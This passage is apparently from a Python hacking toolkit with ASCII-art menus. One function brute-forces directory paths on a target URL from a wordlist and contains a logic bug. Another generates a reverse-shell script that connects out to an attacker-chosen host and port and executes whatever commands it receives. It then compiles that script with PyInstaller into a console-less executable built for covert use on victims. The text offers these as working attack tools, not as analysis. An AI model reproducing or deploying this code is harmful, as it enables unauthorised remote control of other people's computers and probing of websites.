  |___\_/   /________//   ________         /  / ||_|_|_|
  |___ /   (|________/   |\_______\       /  /| |______|
      /                  \|________)     /  /                                                                                        
""",style="red")
    print("[green]            + welcom to ildirb +                 [/green]")
    print("""
|=================================================================
|[1]. [yellow]Use a ready-made file (common.txt)[/yellow]
|[2]. [yellow]Use your own file[/yellow]
|=================================================================
""")
    nuser = input("input number [1-2] >")
    common = "common.txt"
    if nuser == "1":
        common = "common.txt"
        url = input("Enter url :")
        print("[!][yellow]loding...[/yellow]")
        time.sleep(2)
        print("[+][red]running attack...[/red]")
        time.sleep(2)
        print("[red]==================================[/red] + (⌐■_■) + [red]====================================[/red]")
        try:
            with open(common,"r")as f:
                files = f.readlines()
        except:
            print("[yellow][!][/yellow][red]file not fuand ?[/red]")
        def res(url , files):
            for file in files:
                r = file.strip()
                urls = f"{url}{r}"
                try:
                    pon = requests.get(urls)
                    if pon.status_code == 200:
                        print(f"[blue][+][/blue][yellow]url id fond :[/yellow][green]{urls}[/green] [yellow]status code [/yellow][{200}]")
                    if pon.status_code == 403:
                        print(f"[red][!][/red][yellow] + url + =>[/yellow][red]{urls}[/red] [yellow]======> [/yellow][{403}]")
                except:
                    print("[yellow][!][/yellow][red]ERROR[/red]")
    elif nuser == "2":
        fi = input("Enter name file :")
        common = fi
    else:
        print("[red][!]invalid option[/red]")
    res(url , files)




def il_meta():
    console.print("""
                                .       .
                 _.-'\          |\-''''-/|          /`-._
             _.-`     `.       /         \       ,'     '-._
          _.'           `._   ;   \   /   ;   _,'           `._
        .'                 `-.:           :.-'                 `.
      ,`                           , ,                           '.
    ,`                                                             '.
   /                                                                 \
  :,-'''-,                                                     ,-'''-,:
 /'       `                                                   '       '\
          :                                                   :
          : ,-'''-,                                   ,-'''-, :
          /'       `.       _.-'         '-._       .'       '\
                     \    .`    :       :    '.    /
                      . .`       :     :       '. .
                      :/          :   :          \:
                      :            : :            :
cjr                                 :
15apr99
bat
""",style="red")
    print("[red]==================================[/red] + (⌐■_■) + [red]====================================[/red]")
    host = input("Enter the host :")
    port = int(input("Enter the port :"))
    nem_file = input("Enter a file name :")
    print("[yellow]loding...[/yellow]")
    time.sleep(2)
    print("[green]running...[/green]")
    time.sleep(2)
    file =f"""
import socket
import subprocess

def reverse_shell():
    host = '{host}'
    port = {port}
    s = socket.socket()
    try:
        s.connect((host,port))
        s.send(b"[+]connect to server")
    except:
        pass
    while True:
        cmd = s.recv(1024).decode().strip()
        if cmd == "exit":
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
    s.close()

reverse_shell()
""" 
    print("[yellow]File is being created...[/yellow]")
    time.sleep(2)
    for _ in range(100):
        print("=" ,end="" ,flush=True)
        time.sleep(0.03)
    print(">")
    try:
        with open(f"{nem_file}.py","w") as py:
            py.write(file)
    except:
        print("[yellow][!][/yellow][red]ERROR file[/red]")
    commed = [
        sys.executable, "-m", "PyInstaller",
         "--onefile", "--noconsole", f"{nem_file}.py"
    ]
    subprocess.run(commed)
    print("[blue][+][/blue][green]The file has been created[/green]")
    



if __name__ == "__main__":
    main()